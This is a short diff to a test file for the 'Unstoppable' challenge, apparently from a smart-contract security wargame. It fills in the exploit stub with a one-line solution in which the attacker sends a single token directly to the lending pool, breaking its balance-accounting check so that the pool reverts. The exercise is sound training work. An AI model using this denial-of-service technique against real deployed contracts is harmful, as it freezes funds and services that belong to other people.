@@ -39,7 +39,10 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** there is a check for the accounting of the tokens
+         * must match the actual number of tokens in the contract
+         * just send token(s) to contract for it to revert */
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 
     after(async function () {
